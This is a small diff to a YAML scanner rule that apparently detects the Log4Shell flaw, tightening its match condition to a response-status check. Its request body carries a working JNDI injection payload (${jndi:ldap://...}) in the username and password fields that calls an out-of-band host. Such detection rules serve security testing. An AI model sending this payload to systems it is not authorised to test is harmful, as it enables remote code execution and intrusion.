@@ -19,7 +19,7 @@ rules:
       headers:
         Content-Type: application/x-www-form-urlencoded
       body: j_username=${jndi:ldap://{{dnstest}}/tea}&j_password=${jndi:ldap://{{dnstest}}/tea}
-    expression: "true"
+    expression: response.status >= 200
   r2:
     request:
       method: GET
